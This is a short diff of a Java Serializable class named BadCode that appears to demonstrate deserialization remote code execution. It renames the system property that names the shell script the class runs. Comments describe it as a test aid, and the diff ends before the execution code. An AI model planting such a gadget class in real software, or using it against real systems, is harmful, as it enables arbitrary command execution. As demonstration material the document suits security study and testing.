@@ -30,14 +30,14 @@ public class BadCode implements java.io.Serializable
         System.out.println("BadCode will now run hacker script");
 
         // read from system property location of shell script.  It's unlikely this would be avenue taken during real exploit.
-        String cmd = System.getProperty( "serial-exploit-sh" );
+        String cmd = System.getProperty( "remote-code-execution-sh" );
         String loc = System.getProperty( "user.home" );
         System.out.println("user.home=" + loc);
 
-        // throw runtime exception if -Dserial-exploit-sh system param not set. Of course this would never happen in real attack it's here to make it easier for you to test this code.
+        // throw runtime exception if -Dremote-code-execution-sh system param not set. Of course this would never happen in real attack it's here to make it easier for you to test this code.
         if(cmd == null || cmd.length() == 0)
         {
-            throw new RuntimeException( "Must set -Dserial-exploit-sh java system property" );
+            throw new RuntimeException( "Must set -Dremote-code-execution-sh java system property" );
         }
 
         // Now execute the script:
